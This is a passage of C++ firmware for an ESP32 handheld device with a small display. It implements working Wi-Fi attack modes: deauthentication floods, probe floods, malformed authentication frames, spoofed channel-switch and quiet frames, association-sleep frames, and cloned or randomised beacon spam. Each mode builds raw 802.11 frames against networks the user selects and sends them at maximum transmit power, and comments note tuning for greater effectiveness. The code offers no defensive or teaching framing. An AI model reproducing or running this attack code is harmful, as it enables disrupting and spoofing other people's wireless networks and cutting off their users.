    // Sequence number (increment for each packet)
    attackPacketBuffer[22] = (attackSeqNum & 0x0f) << 4;
    attackPacketBuffer[23] = (attackSeqNum & 0xff0) >> 4;
    attackSeqNum++;
    if (attackSeqNum > 0xfff) attackSeqNum = 0;
    
    // SSID element
    attackPacketBuffer[24] = 0x00; // Element ID: SSID
    
    int ssidLen = strnlen(attackTargetSSIDs[probeFloodTargetIndex], 6);
    if (ssidLen > 6) ssidLen = 6;
    attackPacketBuffer[25] = ssidLen; // Length
    
    if (ssidLen > 0) {
        memcpy(&attackPacketBuffer[26], attackTargetSSIDs[probeFloodTargetIndex], ssidLen);
    }
    
    int pktLen = 26 + ssidLen;
    
    // Send MORE packets with LESS delay for better effectiveness (increased from 3 to 8)
    for (int i = 0; i < 8; i++) {
        randomMac();
        memcpy(&attackPacketBuffer[10], macAddr, 6);
        esp_wifi_80211_tx(WIFI_IF_STA, attackPacketBuffer, pktLen, false);
        attackPacketsSent++;
        delayMicroseconds(500); // Faster transmission
    }
    
    probeFloodTargetIndex++;
    updateAttackStats(attackPacketsSent, attackChannel, tft.color565(0, 200, 255));
    vTaskDelay(1); // Feed watchdog after update
}

// ===== DEAUTH FLOOD =====
static int deauthFloodTargetIndex = 0;
static unsigned long deauthLastUIUpdate = 0;

void runDeauthFlood() {
    if (attackFirstDraw) {
        drawAttackUI("Deauth Flood", "Disconnecting clients", tft.color565(255, 60, 60),
                     "Sent", 0, "Targets", String(attackTargetCount).c_str());
        attackPacketsSent = 0;
        deauthFloodTargetIndex = 0;
        attackSeqNum = 0;
        deauthLastUIUpdate = 0;
        
        // Set MAXIMUM WiFi power for maximum range
        esp_wifi_set_max_tx_power(84);  // 21 dBm = maximum
    }
    
    if (attackTargetCount == 0) {
        tft.setTextSize(1);
        tft.setTextColor(ILI9341_RED);
        tft.setCursor(18, 150);
        tft.print("No targets selected!");
        return;
    }
    
    // Send packets MORE frequently for better effectiveness (reduced from 50ms to 20ms)
    if (millis() - attackLastSend < 20) return;
    attackLastSend = millis();
    
    // Cycle through targets with bounds check
    if (deauthFloodTargetIndex >= attackTargetCount) deauthFloodTargetIndex = 0;
    if (deauthFloodTargetIndex < 0) deauthFloodTargetIndex = 0;
    
    attackChannel = attackTargetChannels[deauthFloodTargetIndex];
    esp_wifi_set_channel(attackChannel, WIFI_SECOND_CHAN_NONE);
    
    // Build deauth packet using shared buffer
    memset(attackPacketBuffer, 0, 26);
    
    attackPacketBuffer[0] = 0xC0; // Deauth
    attackPacketBuffer[1] = 0x00;
    attackPacketBuffer[2] = 0x3A;
    attackPacketBuffer[3] = 0x01;
    
    // Check if BSSID is valid
    bool validBSSID = false;
    for (int i = 0; i < 6; i++) {
        if (attackTargetBSSIDs[deauthFloodTargetIndex][i] != 0) {
            validBSSID = true;
            break;
        }
    }
    
    if (!validBSSID) {
        deauthFloodTargetIndex++;
        return;
    }
    
    // Receiver: broadcast
    memset(&attackPacketBuffer[4], 0xFF, 6);
    
    // Sender: AP BSSID
    memcpy(&attackPacketBuffer[10], attackTargetBSSIDs[deauthFloodTargetIndex], 6);
    
    // BSSID: AP BSSID
    memcpy(&attackPacketBuffer[16], attackTargetBSSIDs[deauthFloodTargetIndex], 6);
    
    // Sequence number (increment for each packet)
    attackPacketBuffer[22] = (attackSeqNum & 0x0f) << 4;
    attackPacketBuffer[23] = (attackSeqNum & 0xff0) >> 4;
    attackSeqNum++;
    if (attackSeqNum > 0xfff) attackSeqNum = 0;
    
    // Reason code (0x02 = Previous authentication no longer valid)
    attackPacketBuffer[24] = 0x02;
    attackPacketBuffer[25] = 0x00;
    
    // Send LARGER burst of deauth packets for better effectiveness (increased from 5 to 10)
    for (int i = 0; i < 10; i++) {
        esp_wifi_80211_tx(WIFI_IF_STA, attackPacketBuffer, 26, false);
        attackPacketsSent++;
        delayMicroseconds(50);  // Reduced delay for faster transmission
    }
    
    deauthFloodTargetIndex++;
    
    // Update UI every 300ms to reduce flicker
    if (millis() - deauthLastUIUpdate > 300) {
        deauthLastUIUpdate = millis();
        
        const uint16_t bg = ILI9341_BLACK;
        const uint16_t textSoft = tft.color565(160, 160, 160);
        
        tft.fillRect(12, 90, 216, 180, bg);
        
        // Packets sent
        tft.setTextSize(2);
        tft.setTextColor(tft.color565(255, 60, 60));
        tft.setCursor(18, 95);
        tft.print("Sent: ");
        tft.print(attackPacketsSent);
        
        // Current target info
        tft.setTextSize(1);
        tft.setTextColor(ILI9341_YELLOW);
        tft.setCursor(18, 125);
        tft.print("Current Target:");
        
        int displayIndex = (deauthFloodTargetIndex > 0) ? deauthFloodTargetIndex - 1 : attackTargetCount - 1;
        
        tft.setTextColor(ILI9341_WHITE);
        tft.setCursor(18, 140);
        tft.print("SSID: ");
        tft.print(attackTargetSSIDs[displayIndex]);
        
        tft.setCursor(18, 152);
        tft.print("Ch: ");
        tft.print(attackTargetChannels[displayIndex]);
        tft.print("  BSSID: ");
        tft.printf("%02X:%02X:%02X",
                   attackTargetBSSIDs[displayIndex][0],
                   attackTargetBSSIDs[displayIndex][1],
                   attackTargetBSSIDs[displayIndex][2]);
        
        // All targets list
        if (attackTargetCount > 1) {
            tft.setTextColor(textSoft);
            tft.setCursor(18, 170);
            tft.print("Attacking ");
            tft.print(attackTargetCount);
            tft.print(" instance(s)");
            
            // Show all channels being attacked
            tft.setCursor(18, 182);
            tft.print("Channels: ");
            for (int i = 0; i < attackTargetCount && i < 5; i++) {
                tft.print(attackTargetChannels[i]);
                if (i < attackTargetCount - 1) tft.print(",");
            }
        }
        
        // Status
        tft.setTextColor(ILI9341_GREEN);
        tft.setCursor(18, 200);
        tft.print("Status: Active");
        
        tft.setTextColor(textSoft);
        tft.setCursor(18, 215);
        tft.print("Cycling through targets...");
    }
    
    vTaskDelay(1); // Feed watchdog
}

// ===== BAD MSG ATTACK =====
// DISABLED - Causes watchdog resets due to complexity
// This attack requires large EAPOL packets (153 bytes) which cause stack issues
void runBadMsg() {
    if (attackFirstDraw) {
        drawAttackUI("Bad Msg", "Malformed frames", tft.color565(255, 150, 0),
                     "Sent", 0, "Targets", String(attackTargetCount).c_str());
        attackPacketsSent = 0;
        attackSeqNum = 0;
        attackFirstDraw = false;
        
        // Set MAXIMUM WiFi power for maximum range
        esp_wifi_set_max_tx_power(84);  // 21 dBm = maximum
    }
    
    if (attackTargetCount == 0) {
        tft.setTextSize(1);
        tft.setTextColor(ILI9341_RED);
        tft.setCursor(18, 150);
        tft.print("No targets selected!");
        return;
    }
    
    // Send MORE frequently for better effectiveness (reduced from 100ms to 60ms)
    if (millis() - attackLastSend < 60) return;
    attackLastSend = millis();
    
    // Cycle through targets
    static int targetIdx = 0;
    if (targetIdx >= attackTargetCount) targetIdx = 0;
    
    attackChannel = attackTargetChannels[targetIdx];
    esp_wifi_set_channel(attackChannel, WIFI_SECOND_CHAN_NONE);
    
    // Build malformed authentication frame
    memset(attackPacketBuffer, 0, 32);
    attackPacketBuffer[0] = 0xB0; // Auth frame
    attackPacketBuffer[1] = 0x00;
    attackPacketBuffer[2] = 0x3A; // Duration
    attackPacketBuffer[3] = 0x01;
    
    // Destination: AP
    memcpy(&attackPacketBuffer[4], attackTargetBSSIDs[targetIdx], 6);
    // Source: random client
    for (int i = 0; i < 6; i++) attackPacketBuffer[10 + i] = esp_random() & 0xFF;
    // BSSID: AP
    memcpy(&attackPacketBuffer[16], attackTargetBSSIDs[targetIdx], 6);
    
    // Sequence
    attackPacketBuffer[22] = (attackSeqNum & 0x0f) << 4;
    attackPacketBuffer[23] = (attackSeqNum & 0xff0) >> 4;
    attackSeqNum++;
    
    // Malformed auth body (invalid algorithm + status)
    attackPacketBuffer[24] = 0xFF; // Invalid algorithm
    attackPacketBuffer[25] = 0xFF;
    attackPacketBuffer[26] = 0xFF; // Invalid transaction
    attackPacketBuffer[27] = 0xFF;
    attackPacketBuffer[28] = 0xFF; // Invalid status
    attackPacketBuffer[29] = 0xFF;
    
    // Send MORE packets per burst for better effectiveness (increased from 1 to 3)
    for (int burst = 0; burst < 3; burst++) {
        esp_wifi_80211_tx(WIFI_IF_STA, attackPacketBuffer, 30, false);
        attackPacketsSent++;
        delayMicroseconds(400);  // Faster transmission
    }
    
    targetIdx++;
    updateAttackStats(attackPacketsSent, attackChannel, tft.color565(255, 150, 0));
    vTaskDelay(1);
}

// ===== CHANNEL SWITCH ATTACK =====
// DISABLED - Causes watchdog resets due to complexity  
void runChannelSwitch() {
    if (attackFirstDraw) {
        drawAttackUI("Chan Switch", "Force channel hop", tft.color565(100, 255, 200),
                     "Sent", 0, "Targets", String(attackTargetCount).c_str());
        attackPacketsSent = 0;
        attackSeqNum = 0;
        attackFirstDraw = false;
        
        // Set MAXIMUM WiFi power for maximum range
        esp_wifi_set_max_tx_power(84);  // 21 dBm = maximum
    }
    
    if (attackTargetCount == 0) {
        tft.setTextSize(1);
        tft.setTextColor(ILI9341_RED);
        tft.setCursor(18, 150);
        tft.print("No targets selected!");
        return;
    }
    
    // Send MORE frequently for better effectiveness (reduced from 200ms to 100ms)
    if (millis() - attackLastSend < 100) return;
    attackLastSend = millis();
    
    static int targetIdx = 0;
    if (targetIdx >= attackTargetCount) targetIdx = 0;
    
    attackChannel = attackTargetChannels[targetIdx];
    esp_wifi_set_channel(attackChannel, WIFI_SECOND_CHAN_NONE);
    
    // Build Channel Switch Announcement frame
    memset(attackPacketBuffer, 0, 32);
    attackPacketBuffer[0] = 0xD0; // Action frame
    attackPacketBuffer[1] = 0x00;
    attackPacketBuffer[2] = 0x3A;
    attackPacketBuffer[3] = 0x01;
    
    // Broadcast
    memset(&attackPacketBuffer[4], 0xFF, 6);
    // Source: AP
    memcpy(&attackPacketBuffer[10], attackTargetBSSIDs[targetIdx], 6);
    // BSSID: AP
    memcpy(&attackPacketBuffer[16], attackTargetBSSIDs[targetIdx], 6);
    
    // Sequence
    attackPacketBuffer[22] = (attackSeqNum & 0x0f) << 4;
    attackPacketBuffer[23] = (attackSeqNum & 0xff0) >> 4;
    attackSeqNum++;
    
    // Action frame body: Channel Switch
    attackPacketBuffer[24] = 0x00; // Category: Spectrum Management
    attackPacketBuffer[25] = 0x04; // Action: Channel Switch
    attackPacketBuffer[26] = 0x25; // Element ID: Channel Switch
    attackPacketBuffer[27] = 0x03; // Length
    attackPacketBuffer[28] = 0x01; // Mode: 1 (no transmissions)
    attackPacketBuffer[29] = (esp_random() % 11) + 1; // Random channel 1-11
    attackPacketBuffer[30] = 0x00; // Count: immediate
    
    // Send MORE packets per burst for better effectiveness (increased from 1 to 4)
    for (int burst = 0; burst < 4; burst++) {
        esp_wifi_80211_tx(WIFI_IF_STA, attackPacketBuffer, 31, false);
        attackPacketsSent++;
        delayMicroseconds(500);  // Faster transmission
    }
    
    targetIdx++;
    updateAttackStats(attackPacketsSent, attackChannel, tft.color565(100, 255, 200));
    vTaskDelay(1);
}

// ===== QUIET ATTACK =====
// DISABLED - Causes watchdog resets due to complexity
void runQuiet() {
    if (attackFirstDraw) {
        drawAttackUI("Quiet Attack", "Silence network", tft.color565(255, 255, 100),
                     "Sent", 0, "Targets", String(attackTargetCount).c_str());
        attackPacketsSent = 0;
        attackSeqNum = 0;
        attackFirstDraw = false;
        
        // Set MAXIMUM WiFi power for maximum range
        esp_wifi_set_max_tx_power(84);  // 21 dBm = maximum
    }
    
    if (attackTargetCount == 0) {
        tft.setTextSize(1);
        tft.setTextColor(ILI9341_RED);
        tft.setCursor(18, 150);
        tft.print("No targets selected!");
        return;
    }
    
    // Send MORE frequently for better effectiveness (reduced from 150ms to 80ms)
    if (millis() - attackLastSend < 80) return;
    attackLastSend = millis();
    
    static int targetIdx = 0;
    if (targetIdx >= attackTargetCount) targetIdx = 0;
    
    attackChannel = attackTargetChannels[targetIdx];
    esp_wifi_set_channel(attackChannel, WIFI_SECOND_CHAN_NONE);
    
    // Build Quiet element frame
    memset(attackPacketBuffer, 0, 32);
    attackPacketBuffer[0] = 0xD0; // Action frame
    attackPacketBuffer[1] = 0x00;
    attackPacketBuffer[2] = 0x3A;
    attackPacketBuffer[3] = 0x01;
    
    // Broadcast
    memset(&attackPacketBuffer[4], 0xFF, 6);
    // Source: AP
    memcpy(&attackPacketBuffer[10], attackTargetBSSIDs[targetIdx], 6);
    // BSSID: AP
    memcpy(&attackPacketBuffer[16], attackTargetBSSIDs[targetIdx], 6);
    
    // Sequence
    attackPacketBuffer[22] = (attackSeqNum & 0x0f) << 4;
    attackPacketBuffer[23] = (attackSeqNum & 0xff0) >> 4;
    attackSeqNum++;
    
    // Quiet element in action frame
    attackPacketBuffer[24] = 0x00; // Category: Spectrum Management
    attackPacketBuffer[25] = 0x06; // Action: Quiet
    attackPacketBuffer[26] = 0x28; // Element ID: Quiet
    attackPacketBuffer[27] = 0x06; // Length
    attackPacketBuffer[28] = 0x01; // Count
    attackPacketBuffer[29] = 0x01; // Period
    attackPacketBuffer[30] = 0xFF; // Duration (high byte)
    attackPacketBuffer[31] = 0xFF; // Duration (low byte) - max silence
    
    // Send MORE packets per burst for better effectiveness (increased from 1 to 4)
    for (int burst = 0; burst < 4; burst++) {
        esp_wifi_80211_tx(WIFI_IF_STA, attackPacketBuffer, 32, false);
        attackPacketsSent++;
        delayMicroseconds(500);  // Faster transmission
    }
    
    targetIdx++;
    updateAttackStats(attackPacketsSent, attackChannel, tft.color565(255, 255, 100));
    vTaskDelay(1);
}

// ===== ASSOCIATION SLEEP ATTACK =====
// DISABLED - Causes watchdog resets due to complexity
void runAssocSleep() {
    if (attackFirstDraw) {
        drawAttackUI("Assoc Sleep", "Force power save", tft.color565(255, 100, 255),
                     "Sent", 0, "Targets", String(attackTargetCount).c_str());
        attackPacketsSent = 0;
        attackSeqNum = 0;
        attackFirstDraw = false;
        
        // Set MAXIMUM WiFi power for maximum range
        esp_wifi_set_max_tx_power(84);  // 21 dBm = maximum
    }
    
    if (attackTargetCount == 0) {
        tft.setTextSize(1);
        tft.setTextColor(ILI9341_RED);
        tft.setCursor(18, 150);
        tft.print("No targets selected!");
        return;
    }
    
    // Send MORE frequently for better effectiveness (reduced from 120ms to 70ms)
    if (millis() - attackLastSend < 70) return;
    attackLastSend = millis();
    
    static int targetIdx = 0;
    if (targetIdx >= attackTargetCount) targetIdx = 0;
    
    attackChannel = attackTargetChannels[targetIdx];
    esp_wifi_set_channel(attackChannel, WIFI_SECOND_CHAN_NONE);
    
    // Build association request with power save enabled
    memset(attackPacketBuffer, 0, 32);
    attackPacketBuffer[0] = 0x00; // Association request
    attackPacketBuffer[1] = 0x00;
    attackPacketBuffer[2] = 0x3A;
    attackPacketBuffer[3] = 0x01;
    
    // Destination: AP
    memcpy(&attackPacketBuffer[4], attackTargetBSSIDs[targetIdx], 6);
    // Source: random client
    for (int i = 0; i < 6; i++) attackPacketBuffer[10 + i] = esp_random() & 0xFF;
    // BSSID: AP
    memcpy(&attackPacketBuffer[16], attackTargetBSSIDs[targetIdx], 6);
    
    // Sequence
    attackPacketBuffer[22] = (attackSeqNum & 0x0f) << 4;
    attackPacketBuffer[23] = (attackSeqNum & 0xff0) >> 4;
    attackSeqNum++;
    
    // Capability: Power Management bit set
    attackPacketBuffer[24] = 0x11; // ESS + Power Save
    attackPacketBuffer[25] = 0x10; // Power Management enabled
    attackPacketBuffer[26] = 0x00; // Listen interval
    attackPacketBuffer[27] = 0xFF; // Max listen interval
    
    // Send MORE packets per burst for better effectiveness (increased from 1 to 4)
    for (int burst = 0; burst < 4; burst++) {
        esp_wifi_80211_tx(WIFI_IF_STA, attackPacketBuffer, 28, false);
        attackPacketsSent++;
        delayMicroseconds(500);  // Faster transmission
    }
    
    targetIdx++;
    updateAttackStats(attackPacketsSent, attackChannel, tft.color565(255, 100, 255));
    vTaskDelay(1);
}

// ===== AP CLONE SPAM =====
static int apCloneTargetIndex = 0;
static int apCloneVariation = 0;

void runAPCloneSpam() {
    if (attackFirstDraw) {
        drawAttackUI("AP Clone Spam", "Cloned AP beacons", tft.color565(180, 100, 255),
                     "Sent", 0, "Targets", String(attackTargetCount).c_str());
        attackPacketsSent = 0;
        apCloneTargetIndex = 0;
        apCloneVariation = 0;
        attackSeqNum = 0;
        
        // Set MAXIMUM WiFi power for maximum range
        esp_wifi_set_max_tx_power(84);  // 21 dBm = maximum
    }
    
    if (attackTargetCount == 0) {
        tft.setTextSize(1);
        tft.setTextColor(ILI9341_RED);
        tft.setCursor(18, 150);
        tft.print("No targets selected!");
        return;
    }
    
    // Send MORE frequently for better effectiveness (reduced from 50ms to 30ms)
    if (millis() - attackLastSend < 30) return;
    attackLastSend = millis();
    
    // Cycle through targets with bounds check
    if (apCloneTargetIndex >= attackTargetCount) {
        apCloneTargetIndex = 0;
        apCloneVariation++;
        if (apCloneVariation >= 10) apCloneVariation = 0; // Create 10 clones per AP
    }
    if (apCloneTargetIndex < 0) apCloneTargetIndex = 0;
    
    int baseLen = strnlen(attackTargetSSIDs[apCloneTargetIndex], 15);
    if (baseLen > 15) baseLen = 15;
    
    attackChannel = attackTargetChannels[apCloneTargetIndex];
    esp_wifi_set_channel(attackChannel, WIFI_SECOND_CHAN_NONE);
    
    // Build SSID with added spaces for this variation
    randomMac();
    memcpy(&beaconPacket[10], macAddr, 6);  // Source MAC (random)
    memcpy(&beaconPacket[16], macAddr, 6);  // BSSID (same as source)
    
    memset(&beaconPacket[38], 0, 32);
    memcpy(&beaconPacket[38], attackTargetSSIDs[apCloneTargetIndex], baseLen);
    
    // Add spaces to make each clone unique
    int finalLen = baseLen + apCloneVariation;
    if (finalLen > 32) finalLen = 32;
    for (int s = 0; s < apCloneVariation && (baseLen + s) < 32; s++) {
        beaconPacket[38 + baseLen + s] = ' ';
    }
    
    beaconPacket[37] = finalLen;
    beaconPacket[83] = attackChannel;
    
    // Update sequence number
    beaconPacket[22] = (attackSeqNum & 0x0f) << 4;
    beaconPacket[23] = (attackSeqNum & 0xff0) >> 4;
    attackSeqNum++;
    if (attackSeqNum > 0xfff) attackSeqNum = 0;
    
    // Send MORE beacons for this clone to keep it visible (increased from 3 to 5)
    for (int burst = 0; burst < 5; burst++) {
        esp_wifi_80211_tx(WIFI_IF_AP, beaconPacket, sizeof(beaconPacket), false);
        attackPacketsSent++;
        delayMicroseconds(700);  // Faster transmission
    }
    
    apCloneTargetIndex++;
    updateAttackStats(attackPacketsSent, attackChannel, tft.color565(180, 100, 255));
}

void handleWiFiScannerInput() {
    extern int activeToolIndex;
    
    // Allow input even while scanning - removed blocking

    int totalItems = wifiNetworkCount + 1;
    
    // LEFT button - back
    if (isPressed(BTN_LEFT)) {
        if (selectingAttackTargets) {
            selectingAttackTargets = false;
            attackTargetCount = 0;
            stopCurrentRadioMode(true);
            navigateBack();
        }
        delay(200);
        return;
    }

    if (isPressed(BTN_UP)) {
        wifiSelectedIndex--;
        if (wifiSelectedIndex < 0) wifiSelectedIndex = totalItems - 1;
        wifiNeedsRedraw = true;
        delay(150);
    }

    if (isPressed(BTN_DOWN)) {
        wifiSelectedIndex++;
        if (wifiSelectedIndex >= totalItems) wifiSelectedIndex = 0;
        wifiNeedsRedraw = true;
        delay(150);
    }

    if (isPressed(BTN_SELECT)) {

        if (wifiSelectedIndex == wifiNetworkCount) {
            LOG("RESCAN");

            wifiScanRunning = true;
            wifiScanReadyAt = millis() + 420UL;
            wifiScanKeepStatusUntil = millis() + 1400UL;
            wifiScanAutoRetryPending = true;
            wifiScanWarmupRetries = 2;
            setWiFiScanStatus("Queueing scan");
            wifiNetworkCount = 0;
            wifiScrollOffset = 0;

            clearWiFiScanResults();

            wifiScannerFirstDraw = true;

            tft.fillRect(0, 20, 240, 300, ILI9341_BLACK);
            delay(200);
            // Don't set wifiNeedsRedraw here - let scan task set it when done
            return;
        }
        
        // If selecting attack target, select this AP and start attack immediately
        if (selectingAttackTargets && wifiSelectedIndex < wifiNetworkCount) {
            // Find ALL instances of this SSID (same SSID on different channels/BSSIDs)
            const char* selectedSSID = wifiSSIDs[wifiSelectedIndex];
            attackTargetCount = 0;
            
            for (int i = 0; i < wifiNetworkCount && attackTargetCount < 5; i++) {
                // Check if this AP has the same SSID
                if (strcmp(wifiSSIDs[i], selectedSSID) == 0) {
                    // Store this target
                    strncpy(attackTargetSSIDs[attackTargetCount], wifiSSIDs[i], 15);
                    attackTargetSSIDs[attackTargetCount][15] = '\0';
                    
                    // Parse BSSID string to binary
                    sscanf(wifiBSSID[i], "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                           &attackTargetBSSIDs[attackTargetCount][0], 
                           &attackTargetBSSIDs[attackTargetCount][1], 
                           &attackTargetBSSIDs[attackTargetCount][2],
                           &attackTargetBSSIDs[attackTargetCount][3], 
                           &attackTargetBSSIDs[attackTargetCount][4], 
                           &attackTargetBSSIDs[attackTargetCount][5]);
                    
                    attackTargetChannels[attackTargetCount] = wifiChannel[i];
                    attackTargetCount++;
                }
            }
            
            // Show confirmation message
            tft.fillRect(0, 100, 240, 60, ILI9341_BLACK);
            tft.setTextSize(1);
            tft.setTextColor(ILI9341_GREEN);
            tft.setCursor(20, 110);
            tft.print("Found ");
            tft.print(attackTargetCount);
            tft.print(" instance(s)");
            tft.setCursor(20, 125);
            tft.print("of '");
            tft.print(selectedSSID);
            tft.print("'");
            delay(1500);
            
            selectingAttackTargets = false;
            
            // Determine which attack to start
            RadioMode attackMode = WIFI_ATTACK_PROBE_FLOOD;
            if (activeToolIndex == 3) attackMode = WIFI_ATTACK_DEAUTH_FLOOD;
            else if (activeToolIndex == 4) attackMode = WIFI_ATTACK_BAD_MSG;
            else if (activeToolIndex == 5) attackMode = WIFI_ATTACK_CHANNEL_SWITCH;
            else if (activeToolIndex == 6) attackMode = WIFI_ATTACK_QUIET;
            else if (activeToolIndex == 7) attackMode = WIFI_ATTACK_ASSOC_SLEEP;
            else if (activeToolIndex == 8) attackMode = WIFI_ATTACK_AP_CLONE;
            
            enterMode(attackMode);
            attackFirstDraw = true;
            attackLastSend = 0;
            attackPacketsSent = 0;
            attackChannel = attackTargetChannels[0];
            resetWiFi();
            
            // Use STA mode for deauth/probe/bad msg/channel switch/quiet/assoc sleep, AP mode for beacon spam
            if (attackMode == WIFI_ATTACK_AP_CLONE) {
                WiFi.mode(WIFI_AP);
            } else {
                WiFi.mode(WIFI_STA);
                esp_wifi_set_promiscuous(false);
            }
            
            esp_wifi_set_max_tx_power(84);
            esp_wifi_set_channel(attackChannel, WIFI_SECOND_CHAN_NONE);
            delay(200);
            return;
        }

        // Normal mode - show detail
        if (wifiSelectedIndex < wifiNetworkCount) {  // Bounds check to prevent crash
            captureWiFiDetailSnapshot(wifiSelectedIndex);
            wifiDetailIndex = wifiSelectedIndex;
            currentScreen = SCREEN_WIFI_DETAIL;
            wifiDetailActive = false;
            extern bool wifiDetailDrawn;
            wifiDetailDrawn = false;  // force redraw on entry
            drawWiFiDetail();
        }
        delay(200);
    }
}

void runWiFiBeacon() {

    // ===== INIT EVERY TIME MODE IS ENTERED =====
    if (!beaconInitialized) {
        if (wifiInitRetryAt != 0 && millis() < wifiInitRetryAt) {
            return;
        }
        releaseTransientIconHeapForMode("WiFi");

        esp_wifi_set_promiscuous_rx_cb(NULL);

        resetWiFi();

        if (!WiFi.mode(WIFI_AP)) {
            LOG("WiFi AP mode failed");
            wifiInitRetryAt = millis() + 1500UL;
            return;
        }

        esp_wifi_set_promiscuous(false);
        // Set MAXIMUM WiFi power for maximum range
        esp_wifi_set_max_tx_power(84);  // 21 dBm = maximum

        wifiInitRetryAt = 0;
        beaconInitialized = true;
    }


    // ===== TIMING =====
    static unsigned long lastSend = 0;

    // Send MORE frequently for better effectiveness (reduced from 200ms to 100ms)
    if (millis() - lastSend < 100) return;
    lastSend = millis();


    // ===== CHANNEL HOP =====
    nextChannel();


    // ===== SSID COUNT PER BURST =====
    // Increased from 25 to 40 for more aggressive beacon spam
    const int SSID_COUNT = 40;

    for (int n = 0; n < SSID_COUNT; n++) {

        char ssid[32];

        int type = random(6);

        switch (type) {

            case 0:
                sprintf(ssid, "NETGEAR_%dG_%04X", random(2,6), random(0xFFFF));
                break;

            case 1:
                sprintf(ssid, "ATT-Home-%04X", random(0xFFFF));
                break;

            case 2:
                sprintf(ssid, "XfinityWiFi-%04X", random(0xFFFF));
                break;

            case 3:
                sprintf(ssid, "TP-Link_%04X", random(0xFFFF));
                break;

            case 4:
                sprintf(ssid, "Home-%04d", random(1000,9999));
                break;

            case 5:
                sprintf(ssid, "DIRECT-%02X-Printer", random(0xFF));
                break;
        }

        int len = strlen(ssid);

        // 🔥 SAVE FOR UI
        strncpy(lastSSID, ssid, sizeof(lastSSID));

        // ===== RANDOM MAC =====
        randomMac();

        memcpy(&beaconPacket[10], macAddr, 6);
        memcpy(&beaconPacket[16], macAddr, 6);

        memset(&beaconPacket[38], ' ', 32);  // Fill with spaces
        memcpy(&beaconPacket[38], ssid, len);

        beaconPacket[37] = len;
        beaconPacket[83] = wifi_channel;

        // ===== SEND =====
        // Increased from 2 to 3 packets per SSID for better visibility
        for (int k = 0; k < 3; k++) {
            esp_wifi_80211_tx(WIFI_IF_AP, beaconPacket, sizeof(beaconPacket), false);
            beaconPackets++;
            delayMicroseconds(800);  // Faster transmission
        }
    }


    // ===== UI SYSTEM (sniffer-style dashboard) =====
    const uint16_t bg = ILI9341_BLACK;
    const uint16_t accent = tft.color565(100, 200, 255);
    const uint16_t textSoft = tft.color565(160, 160, 160);
    const uint16_t rowFill = tft.color565(18, 18, 18);
    static int lastChannelShown = -1;
    static int lastPpsShown = -1;
    static unsigned long lastPacketsShown = 0;
    static char prevSSID[24] = "";

    if (beaconFirstDraw) {
        tft.fillRect(0, 20, 240, 300, bg);
        tft.drawFastHLine(8, 68, 224, tft.color565(52, 52, 52));

        tft.setTextSize(2);
        tft.setTextColor(accent);
        tft.setCursor(18, 40);
        tft.print("Beacon");

        tft.setTextSize(1);
        tft.setTextColor(textSoft);
        tft.setCursor(18, 58);
        tft.print("Broadcast activity");

        tft.setCursor(12, 278);
        tft.print("LEFT back");

        lastChannelShown = -1;
        lastPpsShown = -1;
        lastPacketsShown = 0xFFFFFFFFUL;
        prevSSID[0] = 0;
        beaconFirstDraw = false;
    }

    if (millis() - lastUIUpdate > 1000) {
        beaconPPS = beaconPackets - lastPacketSnapshot;
        lastPacketSnapshot = beaconPackets;
        lastUIUpdate = millis();
    }

    const bool statsChanged =
        wifi_channel != lastChannelShown ||
        beaconPPS != lastPpsShown ||
        beaconPackets != lastPacketsShown ||
        strcmp(prevSSID, lastSSID) != 0;

    if (!statsChanged) return;

    tft.fillRoundRect(8, 78, 224, 32, 4, rowFill);
    tft.drawRoundRect(8, 78, 224, 32, 4, tft.color565(44, 44, 44));
    tft.setTextSize(1);
    tft.setTextColor(accent);
    tft.setCursor(14, 84);
    tft.print("Channel");
    tft.setTextColor(ILI9341_WHITE);
    tft.setCursor(150, 84);
    tft.print(wifi_channel);
    tft.setTextColor(textSoft);
    tft.setCursor(14, 96);
    tft.print("Packets ");
    tft.print(beaconPackets);

    tft.fillRoundRect(8, 116, 224, 32, 4, rowFill);
    tft.drawRoundRect(8, 116, 224, 32, 4, tft.color565(44, 44, 44));
    tft.setTextColor(accent);
    tft.setCursor(14, 122);
    tft.print("Rate");
    tft.setTextColor(ILI9341_WHITE);
    tft.setCursor(150, 122);
    tft.print(beaconPPS);
    tft.print(" pps");
    tft.setTextColor(textSoft);
    tft.setCursor(14, 134);
    tft.print("Random beacon frames");

    tft.fillRoundRect(8, 154, 224, 58, 4, rowFill);
    tft.drawRoundRect(8, 154, 224, 58, 4, tft.color565(44, 44, 44));
    tft.setTextColor(accent);
    tft.setCursor(14, 160);
    tft.print("Last SSID");
    tft.setTextColor(ILI9341_WHITE);
    tft.setCursor(14, 176);
    char line1[22];
    strncpy(line1, lastSSID, 21);
    line1[21] = 0;
    tft.print(line1);
    if (strlen(lastSSID) > 21) {
        char line2[22];
        strncpy(line2, lastSSID + 21, 21);
        line2[21] = 0;
        tft.setCursor(14, 190);
        tft.print(line2);
    }

    lastChannelShown = wifi_channel;
    lastPpsShown = beaconPPS;
    lastPacketsShown = beaconPackets;
    strncpy(prevSSID, lastSSID, sizeof(prevSSID) - 1);
    prevSSID[sizeof(prevSSID) - 1] = 0;
}

void runWiFiScanner() {

    unsigned long &lastAnim = lastScanAnim;
    uint8_t &dots = scanDots;
    bool &firstDraw = wifiScannerFirstDraw;
    bool holdScanStatus = (wifiNetworkCount == 0 && wifiScanKeepStatusUntil != 0 && millis() < wifiScanKeepStatusUntil);
    const bool openOnlyFilter = orionToolsWifiOpenOnly();
    const char* wifiFilterLabel = orionToolsWifiFilterLabel();

    // Reset animation when scan ends
    static bool lastScanState = false;
    if (lastScanState && !wifiScanRunning) {
        firstDraw = true;
    }
    lastScanState = wifiScanRunning;

    // Controlled redraw
    if (!wifiNeedsRedraw) return;
    wifiNeedsRedraw = false;

    int visibleItems = 5;
    int totalItems = wifiNetworkCount + 1;
    const uint16_t bg = ILI9341_BLACK;
    const uint16_t accent = tft.color565(100, 200, 255);  // Blue accent like deauth
    const uint16_t textSoft = tft.color565(160, 160, 160);
    const uint16_t rowFill = tft.color565(18, 18, 18);
    const uint16_t rowSelected = tft.color565(34, 34, 34);

    // Scroll logic
    if (wifiSelectedIndex < wifiScrollOffset)
        wifiScrollOffset = wifiSelectedIndex;
    if (wifiSelectedIndex >= wifiScrollOffset + visibleItems)
        wifiScrollOffset = wifiSelectedIndex - visibleItems + 1;

    // Clear screen
    tft.fillRect(0, 20, 240, 300, bg);
    tft.drawFastHLine(8, 68, 224, tft.color565(52, 52, 52));

    // Title
    tft.setTextSize(2);
    tft.setTextColor(accent);
    tft.setCursor(18, 40);
    if (selectingAttackTargets) {
        tft.print("Select Targets");
